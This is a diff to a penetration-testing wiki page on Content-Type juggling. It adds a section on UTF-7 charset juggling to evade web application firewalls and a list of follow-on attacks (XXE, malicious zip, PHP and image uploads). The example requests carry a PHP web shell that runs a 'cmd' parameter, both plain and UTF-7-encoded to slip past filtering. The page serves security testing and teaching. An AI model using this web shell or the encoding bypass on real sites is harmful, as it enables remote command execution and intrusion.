@@ -76,14 +76,60 @@ If the XCTO (X-Content-Type-Options) security header is present, it will be diff
 
 {% endhint %}
 
+### Charset juggling or how to bypass WAF
+
+Sometime, the Content-Type header have another value `charset=<value>`:
+
+```
+Content-Type: text/html; charset=utf-8
+```
+
+In this case, you can try to edit the charset (from utf-8 to utf-7) to bypass security controls such as :&#x20;
+-  Web Application Firewall (WAF)
+-  Regex that check the value of the form
+
+You can't bypass the X-Content-Type-Options even using this technique.
+
+#### Example
+
+In this example, we are able to perform Content-Type juggling by we are getting by a WAF. To bypass it, we are going to perform a charset juggling.
+
+Getting caught by a WAF :&#x20;
+
+```
+POST /foo HTTP/1.1
+Content-Type: application/php; charset=utf-8
+Content-Length: 19
+
+<?php system($_GET["cmd"]); ?>
+```
+
+Bypassing the WAF :&#x20;
+
+```
+POST /foo HTTP/1.1
+Content-Type: application/php; charset=utf-7
+Content-Length: 19
+
++ADw-?php system(+ACQAXw-GET+AFsAIg-cmd+ACIAXQ-)+ADs- ?+AD4-
+```
+
 ## Practice
 
-In order to identify if the target is vulnerable to Content-Type juggling, testers need to answer the following questions:&#x20;
+In order to identify if the target is vulnerable to Content-Type juggling, testers need to answer the following questions :&#x20;
 - Is there a post request with value(s) and Content-Type header ?
 - Is there no presence of the X-Content-Type-Options security header ?
 - Can we edit the Content-Type header and still submit the post request successfully ?
 
-If you answered yes to all the questions, then you should be able to perform Content-Type juggling. Don't forget that, most of the time, Content-Type juggling is a way to upload unattended payload (reverse-shell when the form is used to submit pictures).
+If you answered yes to all the questions, then you should be able to perform Content-Type juggling. Don't forget that, most of the time, Content-Type juggling is a way to perform other attacks. 
+
+Attack to try to perform :&#x20;
+- If you can switch to `application/xml`, try XXE.
+- If you can switch to `application/zip`, try uploading malicious zip file.
+- If you can switch to `application/php`, try uploading php payloads.
+- If you can switch to `application/image`, try uploading [malicious image](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)
+
+**Don't stick to this list, always try several Content-Type values.**
 
 <details>
 
@@ -181,6 +227,6 @@ The last screenshot shows how to perform a blind XXE. You can read more about it
 
 {% embed url="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2" %}
 
-{% embed url="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#content-type-from-json-to-xee2" %}
+{% embed url="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#content-type-from-json-to-xee" %}
 
 {% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type" %}
